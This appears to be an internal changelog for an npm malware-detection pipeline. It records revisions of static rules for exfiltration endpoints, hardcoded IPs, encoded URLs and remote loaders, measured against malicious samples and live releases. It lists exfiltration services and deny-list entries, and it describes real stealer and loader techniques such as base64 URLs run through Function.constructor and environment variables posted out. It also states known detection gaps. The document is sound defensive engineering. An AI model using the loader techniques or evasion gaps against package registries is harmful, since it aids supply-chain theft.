behind 150 tabs has neither of; a tail that starts by chaining a command (`;`, `&&`) or that
pipes into a shell or `iex` now counts. On agent F's scans (every run of 100+ followed by 200+
characters in the 3,716 verdicted live versions, 45 lines, and in the `vm-day1` samples F read,
25) no line that v1 refused is anything but a table, comment or markup, so v2 adds no match
there; it exists for the shape, not for a measured sample.

Known limit: the indentation exception can be gamed (indent the line before as deep), and a
payload padded with other characters (non-breaking spaces, form feeds) is not matched.

### `exfil-endpoint` v3 and the placeholder rule (2026-10-30, `vm-day1`)

v3 requires real-looking webhook ids: a 17-20-digit Discord snowflake (every real webhook in
the DataDog samples has 19 digits), upper-case Slack `T…/B…` ids, and no repeated or
counting-up ids. Measured before adopting it:

- **v3 alone:** benign flags 11 → 10, but malicious shape B 1,006 → 963. The 43 lost samples
  (42 also lost end to end through `pipeline+3`) are a `chai-as-*` typosquat family whose
  only Stage 2 match was a Slack placeholder (`/services/xxx/xxx/xxx`) in a bundled notifier
  template; v2 matched it because its `[A-Z0-9]` was case-insensitive. Losing 42 attacks for
  one benign package (`@zerodot/discord`) is the wrong trade.
- **Adopted:** v3 plus `static.webhook-placeholder` (MEDIUM, weight 3) for exactly what v2
  matched and v3 rejects. Stage 2 flags the same samples as v2 (0 differences out of 4,943),
  and placeholder findings now say what they are and score 3 instead of 5.

### `exfil-endpoint` v4: written Telegram placeholders (2026-10-31)

`api.telegram.org/bot` followed by `<`, `[`, `YOUR_` or `...` (`bot<token>`,
`botYOUR_BOT_TOKEN`) is documentation, not code that sends anywhere, and no longer matches.
`glimmervoid`'s settings help ("open https://api.telegram.org/bot<token>/getUpdates in a
browser") was HIGH in every release. A URL built from a variable (`bot${token}`) still matches,
for the reasons below. `vm-day1`: no malicious sample lost; with the Vite-hash change, two
benign `glimmervoid` releases are no longer reported.

### `exfil-endpoint` v5: deny lists and `interact.sh` (2026-11-03)

Reviewing the queue, about 20 of the first 115 packages were HIGH through this rule alone and
benign. Most were the forms kept on purpose below (tunnel suffixes, `bot${token}`), but two
shapes were plainly not endpoints:

- **Deny lists.** Security tools list these services to block them: `dsh-security-pack`'s vet
  checks (`'webhook.site', 'requestbin.net', … 'interact.sh'`), agent policy engines. v5 drops
  a host written as a whole string literal (`'webhook.site'`, `"x.m.pipedream.net"`, a bare
  `'api.telegram.org/bot'`) when literals of 3 or more different services sit within 400
  characters of it. A URL is never a whole host literal, so `"https://api.telegram.org/bot" +
  token` and `'https://webhook.site/…'` still count beside a list; two services are not a
  list.
- **`interact.sh` inside an identifier.** `this.interact.shareLink(body)` matched. v5 needs a
  boundary after `interact.sh` only: the same boundary on every host lost a `vm-day1` sample
  that posts to the attacker's typo `burpcollaborator.nett`.

`vm-day1`, the 1,181 samples v4 matches: 1,176 malicious and 5 benign still match, 0 lost.
Live, of the 116 reported versions with this finding on disk, 2 lose it (`dsh-security-pack`,
`cortico-world-qqbot-feibi`, both reviewed benign). A small gain; the bulk of this rule's
benign hits are the tunnel and Telegram forms, which stay for recall (next section).

### `exfil-endpoint` v6 and `hardcoded-ip` v3: placeholders, lists and data (2026-11-08)

From [precision round 2](../proposals/precision-round2.md) (F3b, F3c, F4b), approved by the
owner before the rule freeze. A lowered match is LOW, weight 1, with a note saying why, and
does not count toward the rule's cap of three matches a file, so placeholders first never
hide a real endpoint later in the file.

- **Placeholder tunnel hosts (F3c).** A match on `.ngrok(-free).io/app`,
  `.trycloudflare.com` or `.serveo.net` whose own label is a placeholder
  (`_PLACEHOLDER_LABEL`): a whole word label `example(s)`, `xxx…`, `your-…`, `foo`, `bar`,
  `baz`, `abc…`, `random`, `my-app`/`my-tunnel`/..., or `<…>`, `*`, `${…}`, `{…}`, `..`
  (`example.ngrok.app`, `<your-subdomain>.serveo.net`, `*.ngrok.io`). Real quick-tunnel
  names (`purple-river-1234.trycloudflare.com`), words that merely end in one (`sidebar.`)
  and bare suffixes (`endsWith(".trycloudflare.com")`) stay HIGH.
- **A host in a list of domains (F3b).** A whole host literal with quoted literals of at least
  two other domains within 400 characters (v5's window) that are not endpoints themselves
  (`_in_domain_list`): disposable-mail lists naming `webhook.site`, the Public Suffix List
  bundled by CLIs (`ngrok.app`, `ap.ngrok.io` among `ngo.us`, `ipfs.nftstorage.link`:
  `@wirecat/*`, HIGH in every release). A table of nothing but a tunnel's region hosts
  (`'eu.ngrok.io'`, `'us.ngrok.io'`) stays HIGH, as v5 decided (`gina`, `cro-pricing`), and so
  does a URL beside a list. The proposal measured this on the ±60-character snippet; the code
  uses the full window.
- **IPs in data (F4b).** In Stage 2, not the rule (it is a path test, like the "doesn't run"
  note): `hardcoded-ip` is LOW in `.html`/`.htm`/`.xml`/`.svg`/`.csv`/`.tsv`/`.txt`/`.lock`
  files, `NOTICE`/`NOTICES`/`THIRD_PARTY_NOTICES`/`AUTHORS` files and tests named
  `*.test.js`/`*.spec.ts` (`IP_DATA_FILES`), and on a root `package.json` line that is a
  `"url"`/`"repository"`/`"homepage"`/`"bugs"` entry whose value is the package's
  repository, homepage or bugs URL and is used by no script (`_metadata_url`). A hook command
  with the IP stays MEDIUM (`internal-renderers`, `ms-client-portal`, `pandafortunerush`,
  `teick`), and so does every IP in a `package.json` with more IP URLs than the rule's cap
  reports (three metadata URLs could otherwise hide a hook's). `.json` and `.yml` are not data
  here: that variant (F4) loses `dsh-model-pipeline@0.10.4`, an undisclosed LLM-provider IP in
  a config file the app loads.
- **Not done:** comment lines (+15 benign) lose `elf-stats-piney-pinecone-203@1.0.0`, whose only
  `webhook.site` match is the comment above the code that builds the URL; Telegram
  `bot${token}` (F3a) loses `@eooce/sbx@2.0.5` and `node-navsbx@1.0.0`.

Measured with the real code on the proposal's 3,032 reported live versions (2,208 reported
today), each stored MEDIUM/HIGH finding judged again on its file in the captured tarball (the
same match, line and text; about half the versions have one): F3b+F3c -43 reports (17
packages; simulated on snippets: 33), F4b -12 (7 packages); with the rules applied to the
stored snippet and manifest for versions without a tarball, -60 and -20. All benign; no
malicious, unwanted or unverified version lost. On all 3,211 with a verdict: -50 (-67) and
-14 (-22). `vm-day1`: all 65 malicious samples at risk through the two rules (63 and 2) are
still reported by `pipeline+4` with the v6/v3 code.

### `exfil-endpoint` v7 and `hardcoded-ip` v4: what can't be an endpoint (2026-11-09)

From [precision round 3](../proposals/precision-round3.md) (X1-X5), built before the rule
freeze. Each lowered match is LOW, weight 1, with a note, like v6's:

- **X1, core-js's paste.** `pastebin.com/N21QzeQA` exactly (`_CORE_JS_PASTE`): core-js's
  comment about a Safari debugger crash, bundled into editor and polyfill builds
  (`@mnykj/alleditor*`, `dh-vue-poster`). Only the paste's author can change a paste; any other
  paste, or this one through `/raw/`, stays HIGH.
- **X2, host patterns.** A host written as `*.host` (`"*.oastify.com"`, `` `*.m.pipedream.net` ``,
  `_host_pattern`): allow and deny lists; nothing connects to a `*`. `**webhook.site**`
  (Markdown) is not a pattern.
- **X3, separated lists.** v6's list test for unquoted entries (`_in_separated_list`): the host
  is a whole entry between newlines, tabs or commas, written out or as `\n`/`\t` escapes inside
  one string (one side may be the string's quote), with at least two other entries within 400
  characters that are domains and not endpoints themselves: disposable-mail lists in one string
  (`disposable-check`, `is-temp-email`), the Public Suffix List (`utalis-desk`). A list of
  nothing but ngrok region hosts stays HIGH (v5).
- **X4, OAST placeholders.** v6's placeholder-label test applied to OAST hosts too
  (`YOUR-COLLABORATOR-ID.oastify.com`); a registered id (`94bp9h8f….oastify.com`) stays HIGH.
- **X5, `hardcoded-ip` v4.** Example addresses (`EXAMPLE_IPS`: `1.2.3.4`, `4.3.2.1`,
  `12.34.56.78`, `123.45.67.89`, `11.22.33.44`, and `93.184.216.34`, example.com's
  long-standing address) are LOW: input placeholders, help strings, redaction tests. AliDNS
  (`223.5.5.5`, `223.6.6.6`), DNSPod (`119.29.29.29`), 114DNS (`114.114.114.114`,
  `114.114.115.115`) and OpenDNS's second address join `PUBLIC_RESOLVERS` (no finding), as
  DoH and proxy configs write them (`https://223.5.5.5/dns-query`).

Measured with the real code, Stages 1-4 end to end, on all 3,716 verdicted live versions: X1-X4
remove 15 benign reports and X5 10 (with Stage 3's X6 and Stage 4's X7, 47 in all; 0
malicious, unwanted or unverified lost, and no positive's `exfil-endpoint` or `hardcoded-ip`
finding changes). `vm-day1`: see the proposal's section 5. Kept as they are, with the reasons
in the proposal: Telegram `bot${token}` (its token is often encoded elsewhere in the
malicious samples: `github-badge-bot`, `foundry-toolkit`), bare tunnel suffixes, comments.

### Round 4: what is sent, comments, module wrappers (2026-11-10)

From [precision round 4, agent D](../proposals/precision-round4-D.md) (D1-D5), built before
the rule freeze. Each lowered match is LOW, weight 1, with a note; nothing is dropped.
The proposal's D6 (`static.obfuscated` LOW in a bundler's hashed `assets/` chunk, 6 benign) was
rejected by the owner (2026-11-10) and reverted: a drainer injected into a CDN-served asset
must keep the rule's full strength, so `static.obfuscated` is unchanged (v1).

- **`exfil-endpoint` v8 (D1-D3): what is sent, not only where to.** Round 3 rejected lowering
  Telegram `bot${token}` because the malicious samples often hide the token
  (`github-badge-bot`, `foundry-toolkit`, `@eooce/sbx`). Looking at what those samples
  *send* separates them: every one of them, in the same file, reads the hostname, runs
  commands, walks directories or uploads files (`sendDocument`), names a credential store or
  wallet secret, or writes a token literal. v8 lowers three shapes only in a file that does
  none of that (`_collects`: `_COLLECT_PARTS` plus `SensitivePath` and `EnvHarvest`'s
  patterns) and not on an install hook's line:
  - **D1** a Telegram bot API URL whose token the code is handed (`bot${config.botToken}`,
    `"…/bot" + token`, `bot{{TOKEN}}`, PHP `'…/bot'.$t`); a literal token (`bot7123…:AA…`) or a
    shell `bot$TOKEN` stays HIGH;
  - **D2** a `webhook.site` mention with no bin id (a UUID) within 300 characters and no
    subdomain; `hostname: 'webhook.site', path: '/<uuid>'` stays HIGH;
  - **D3** a tunnel's bare suffix (`host.endsWith(".trycloudflare.com")`,
    `allowedHosts: [".ngrok-free.app"]`, `https://….trycloudflare.com` in help text) and
    `api.trycloudflare.com` (the API `cloudflared` registers with); a tunnel's name stays HIGH.

  These notes (and D4's and D5's) depend on the rest of the file, so the "not new" comparison
  with the previous version leaves them out (`CONTEXT_NOTES`, `_key`), as it leaves out
  numbers: a URL the base's quiet file already had is not new when the file starts to collect.
- **`hardcoded-ip` v5 (D4): comment lines.** A URL on a line that is a comment (`//`, `# `,
  a block comment's `/*` or `*` line with no close before the match, `<!--`): commented-out
  base URLs (`// return 'http://47.108.170.69:5401'`), JSDoc alternatives. Not a shebang, not a
  CSS `#id`, not code after `/*! … */` on the same line.
- **`function-require` v2 (D5): module wrappers.** `Function("require", "module", "exports",
  code)` in a file that neither fetches nor decodes anything (`_LOADS_REMOTE`): config loaders
  and test or template sandboxes evaluating code the package compiled from local files. The
  `vm-day1` loaders pass `require` alone (`chai-as-*`, `aes-decode-runner-pro`) or fetch what
  they run (`alpha-replicator`), and stay MEDIUM.

Measured with the real code end to end on all 3,716 verdicted live versions and, for every
`vm-day1` malicious sample on which a touched rule fires at MEDIUM or above, with the rule
itself and then `pipeline+4`: see the proposal for the numbers. **Recall risk:** a stealer
that splits collection and sending into two files (the Telegram call alone in a helper) or
that sends nothing but what the code was given gets LOW for the URL; its collecting file still
carries `sensitive-path`, `env-harvest` and Stage 3's capability findings.

### Round 5: what can't be an endpoint, Emscripten, test files (2026-11-11)

From [precision round 5, agent L](../proposals/precision-round5-L.md) (L1-L5), built before
the rule freeze. Each lowered match is LOW, weight 1, with a note; nothing is dropped. The
owner's earlier rulings stand: vendor-obfuscated products keep `static.obfuscated` at full
strength (only Emscripten glue, which is not obfuscation, changes), and hashed `assets/` chunks
are not demoted (round 4's D6).

- **`obfuscated` v2 (L1): Emscripten glue.** `emulatorjs-build`'s asm.js unzip workers have
  94 `_0x` names: 25 locals of Emscripten's `getCFunc` renamed by a minifier. A file with
  Emscripten's runtime (at least 20 of `getCFunc`, `HEAP8`/`HEAP32`/..., `Module["_" + name]`,
  `STACKTOP`, `wasmMemory`, `_emscripten_*`), fewer than 100 distinct `_0x` names and none of
  javascript-obfuscator's string-array machinery (`_STRING_ARRAY`: a lookup by hex index, the
  `while(!![])` rotation, `push`/`shift`, `parseInt(_0x…(`) is LOW. Obfuscator output pasted
  into glue brings its string array and stays MEDIUM.
- **`exfil-endpoint` v9 (L2): hosts that can't be the endpoint.** Cloudflare names every quick
  tunnel with hyphen-joined words (four on every one seen: `diameter-coins-limitations-parents`
  on `vm-day1`); a `trycloudflare.com` host written out whole with one word (`demo.`, `api.`,
  `u8bcd.`), more labels (`a.b.`), fewer than three words (`abc-def.`, `travel-calm.`) or one
  word repeated (`word-word-word-word.`) is no one's tunnel. A name built in code
  (`${id}.trycloudflare.com`, `id + "-x.trycloudflare.com"`) and any three-word or longer name
  stay HIGH. `pastebin.com/` with no paste id, raw/download/embed view or API after it (the
  site, `/u/<user>`, `/doc_api`, a site list's entry) is LOW too, as are a tunnel label that
  is an ellipsis (`https://….trycloudflare.com`), `api.telegram.org/bot` followed by a comma
  (an entry of a list of service prefixes: no token) and a host literal among literals of
  three services where brand names alone count (`"webhook.site", "requestbin", "ngrok"`: a
  detection rule's substrings). `bot&lt;token&gt;` is dropped as a written placeholder, as
  v4 drops `bot<token>`.
- **`exfil-endpoint` v9 and `hardcoded-ip` v6 (L3): placeholders and examples.** A URL that is
  the value of a UI placeholder (`placeholder: 'cezar.ngrok.app'`, `placeholder="…"`,
  `tunnelUrlPlaceholder:"https://demo…"`) or an `example:` field, at most 80 characters into
  the string, or that follows `e.g.` / `for example` (`# e.g. http://62.84.188.166:30080`), is
  text shown to a user. Not a variable named `example` (`const example = '…'; fetch(example)`)
  and never on an install hook's line.
- **L4, rejected by the owner (2026-11-10): a window around the match in bundles.** The
  proposal asked v8's "collects nothing" only of the 16 KiB around the match in a file over
  64 KiB (4 benign: `@kvali/cli`, `@mostra/runtime`, `nottoday`,
  `kings-never-miss-wallet-sdk`; no positive or `vm-day1` sample changed). Dropped before
  merge: a bundled drainer's Telegram send naturally sits far from the code that collects,
  so the whole file still counts, however large.
- **Stage 2 (L5): test files, and files the package loads.** A match only in a file named as
  a test, story or mock (`TEST_FILES`: `*.test.js`, `*.spec.ts`, `*.stories.tsx`,
  `__mocks__/`, `__fixtures__/`, `__snapshots__/`, `test_*.py`, `*_test.py`, `*_test.go`) is
  LOW, as a match in `NON_EXECUTING` already was. Neither applies to a file the version's
  install hooks or entry points load (`LoadedFiles`: npm's `install_sources` and
  `load_sources`, worked out only when a MEDIUM or higher match is in such a path): a
  postinstall that runs `test/setup.js` keeps its findings. That guard is new for
  `NON_EXECUTING` too.

Measured with the real code on every live version these changes can touch and, for every
`vm-day1` malicious sample on which the touched rules fire, with the rules themselves and then
`pipeline+4`: see the proposal for the numbers.

### `exfil-endpoint` forms checked against the first live day (2026-10-30; no change)

On `20261029T221803Z-npm`, 128 reported versions were HIGH through this rule alone, and live
benign code mostly matched it as `api.telegram.org/bot${token}`, a bare `".trycloudflare.com"`
or a list of ngrok's region hosts. Measured on `vm-day1`'s 1,181 samples with a match:

- **Telegram only with a literal bot token, tunnels only as a concrete host:** 30 malicious
  samples no longer match, 29 of them caught by nothing else, against 4 benign. Rejected:
  malware builds the URL from a variable just as often as benign code does.
- **ngrok's region hosts only** (`ap`, `au`, `eu`, `in`, `jp`, `sa`, `us` before
  `.ngrok.io`; nobody can register them as a tunnel): would clear 9 live reported versions
  (6 packages), and was briefly adopted as v4. The `stage2-rules` evaluation then lost 11
  malicious samples (2,169 -> 2,158 forwarded; `gina`, `cro-pricing`, `edgeone`, ...) that
  carry such lists and nothing else Stage 2 sees. The per-sample scan that said "no sample has
  one" only counted host labels of 3 or more characters. Reverted to v3.

### Hidden URLs and code handed `require` (2026-10-30, `vm-day1`)

The 43 samples above (pino clones named `chai-as-*`, `chai-await-*`, `aligners`,
`argon-web3-chain`, `core-pino`, ...; all new packages, no install hook except `js-prettier`)
were caught by Stage 2 only through the Slack placeholder in a template they copied. Read
statically, what they do is a remote loader, in two variants:

- **28 samples** (`lib/caller.js` or `lib/initializeCaller.js`, called from `main`, or
  spawned detached by it; in `loading-session` the loader is missing from the sample): a URL
  stored as base64 (`atob("aHR0cHM6Ly9...")`, dressed up as
  `process.env.DEV_API_KEY`), fetched with axios, and the response run with
  `new Function.constructor("require", body)(require)`. The hosts are JSON bins
  (`jsonkeeper.com`, `npoint.io`, `jsonsilo.com`, `mocki.io`, `jsonstorage.net`).
- **14 samples** (`lib/writer.js`): strings hex-encoded behind a small decoder (`require`,
  `axios`, `post` and the URL), `{...process.env}` plus host name, user and MAC addresses
  posted (mostly to a `*.vercel.app` host), and the response passed to `eval`.
- **1** (`jsonlogbundler`) has neither: it runs `npm install` of a second package at runtime.

Neither variant matched a MEDIUM rule: `dynamic-code` is LOW and its pattern misses
`Function.constructor(`; `env-harvest` misses a spread with more keys. Two general rules were
added rather than a family signature:

- **`static.encoded-url`**: a whole string literal that decodes (base64, URL-safe base64 or
  hex) to printable `http(s)://` / `ws(s)://` text. Code has no reason to hide an address it
  means to use. The literal must be the whole string, so the same bytes inside a longer blob
  (inline source maps, SVG data URIs) don't count; a scan without that condition matched
  28 benign samples, all of them such blobs. The finding shows the decoded URL.
- **`static.function-require`**: `Function("require", ...)`, including `Function.constructor`
  and `new (Function.constructor)(...)`. Runtime-compiled code that is given the module
  loader can load `child_process` or `https` itself; that is what a second-stage loader needs.

Measured on `vm-day1` (before = the rules without these two):

| Predictor | A | A follow-on | B | B follow-on | Benign A / B (flagged) |
|---|---|---|---|---|---|
| `stage2-rules`, before | 71.5% | 84.0% | 49.9% | 50.7% | 8 / 3 |
| `stage2-rules`, after | 71.6% | 84.0% | **52.4%** | **53.9%** | 8 / 3 |
| `pipeline+3`, before | 89.4% | 29.5% | 66.0% | 22.8% | 5 / 14 |
| `pipeline+3`, after | 89.4% | 29.5% | **67.6%** | 22.8% | 5 / 14 |

- **End to end: 15 more first releases caught (597 → 612), no benign added.** The 43 were
  already forwarded through the placeholder; the gain is other families with the same
  loader: `encoded-url` alone 9 (`tailwindcss-setfavicon`, `vite-support-kit`,
  `vite-ts-icon`, `terminalcolor256`, `graphflowx`, ...), `function-require` alone 5
  (`alpha-replicator`, `express-session-handler`, `mongos-api`, `tw-modern-ui`,
  `vite-plugin-chunk-chop`), both 1 (`vite-enhancer-config`).
- **Of the 43, `encoded-url` matches 42 and `function-require` 27.** `webhook-placeholder`
  is now the only Stage 2 catch for one of them (`jsonlogbundler`), against one benign
  package (`@zerodot/discord`); whether it stays MEDIUM is open.
- **Stage 2 alone: +58 samples (1 A, 22 B, 35 B follow-on), no benign sample added and none
  lost.** Of the 1,500 provisional benign samples, neither rule fires on a forwarded one that
  wasn't already forwarded. The live day is the larger benign test; an encoded-URL literal in
  benign code (a config test, an obfuscated telemetry endpoint) is the expected false positive.
- `function-require` uses possessive quantifiers: the first version backtracked quadratically
  on `Function` followed by a long whitespace run (a stall a package could cause).

### Live trial

Run `20261028T004851Z-npm` (3,687 changes, about 80 minutes of publishes):

- Stage 1 forwarded 1,124 changes: 596 watched, 259 new packages, 256 grown, 13 flagged.
- These formed 749 batches (1,243 versions).
- Stage 2 took 2 min 20 s and downloaded 794 MB (about 14 GB a day).
- 173 versions were over the size cap, and 1 tarball was already gone (404).

Six versions were flagged, all by `exfil-endpoint` or `obfuscated`, and all looked benign on
inspection. Two were real false-positive patterns, which v2 of `exfil-endpoint` fixes:

- **A docs placeholder:** `hooks.slack.com/services/...` in `@bike4mind/cli`. Webhook URLs now
  need an id.
- **An identifier match:** `requestbin` inside `OscoreRequestBinding`. It now needs a dot.

The rest were:
- a Telegram bot client (`woml-cli`);
- a tunnel-host allow-list (`agentiqa`);
- an obfuscated asset bundle (`interboard-assets`).

These are the expected cost of HIGH-recall rules; Stage 3 and Stage 4 scoring are where they
should be separated.

## Tarball retention

Tarballs fetched by the pipeline go into `data/blobs` and follow
[0006](../decisions/0006-scheduled-collection-and-retention.md): 7 days, and indefinitely for
packages named in OSV records (pruning pins them from the run's `static-snapshot.json`). The
immutable index is a fetch cache only: an entry whose blob no run references is deleted with
the blob. Evaluation tarballs live in their own store and are not pruned.

## Known limits

- `dist.unpackedSize` is declared by the publisher, so an attacker can understate growth to
  skip routing, or overstate size to skip the download. A rule comparing declared and real size
  after download is a candidate.
- Updates over 16 MB (32 MB with an install hook) are seen by Stage 1 only. A hook added to a
  package of 16–32 MB leaves its hookless base unread, so all its files count as new (Stage 1
  flags the added hook HIGH anyway).
- Routing is not what misses most live malware: of the 24 live misses Stage 2 never read that
  could still be fetched, none is reported when read
  ([stage2-routing-recall](../proposals/stage2-routing-recall.md)); since small updates are
  routed, `@atedone/workspace-context` is, through `static.shell-startup`.
- File rules see one file: an opt-in set in another file (`lexzymods-baileys`) or a start-up
  file named in one file and written in another (`@atedone` 0.0.13 on) isn't put together.
- Regular expressions don't understand code: a URL in a comment and one in a `fetch` look the
  same. That is Stage 3's job.

## Safety

Contents are decoded as text with replacement characters and only ever matched against regular
expressions. Evidence snippets are truncated and are untrusted data for any renderer. Files over
16 MB are skipped (`MAX_FILE_BYTES`), and so are files with a NUL byte in their first 8 KB
(binaries).
